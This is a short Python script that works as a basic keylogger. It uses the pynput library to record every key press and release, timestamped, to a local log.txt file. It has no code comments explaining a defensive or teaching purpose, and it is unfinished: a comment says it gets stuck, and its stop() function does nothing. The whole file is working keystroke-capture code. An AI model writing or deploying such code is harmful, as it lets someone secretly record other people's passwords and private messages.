import os
from pynput.keyboard import Key, Listener
from pynput import keyboard
import logging
import time

log_dir = os.getcwd()+'/'
logging.basicConfig(filename = (log_dir + "log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def main():
	start('test', 'test')
	# deosnt work (gets stuck on with)
	time.sleep(100)
	stop()

def on_press(key):
	try:
		logging.info('{0} pressed'.format(
			key.char))
	except AttributeError:
		logging.info('special: {0} pressed'.format(
			key))

def on_release(key):
	try:
		logging.info('{0} released'.format(
			key.char))
	except:
		logging.info('special: {0} released'.format(
			key))


def start(session, user):
	with keyboard.Listener(
			on_press=on_press,
			on_release=on_release) as listener:
		listener.join()

# need to embed in listener
def stop():
	return False

if __name__ == '__main__':
	main()



